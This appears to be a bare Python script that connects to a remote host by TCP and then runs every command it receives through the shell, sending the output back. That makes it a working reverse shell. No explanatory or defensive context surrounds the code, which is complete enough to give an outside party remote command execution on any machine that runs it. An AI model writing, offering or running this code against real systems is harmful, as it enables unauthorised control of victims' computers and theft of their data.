import socket

def connect_to_server(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

import subprocess

def shell_loop(sock):
    while True:
        cmd = sock.recv(1024).decode()
        if cmd.lower() in ['exit', 'quit']:
            break
        result = subprocess.getoutput(cmd)
        sock.send(result.encode())
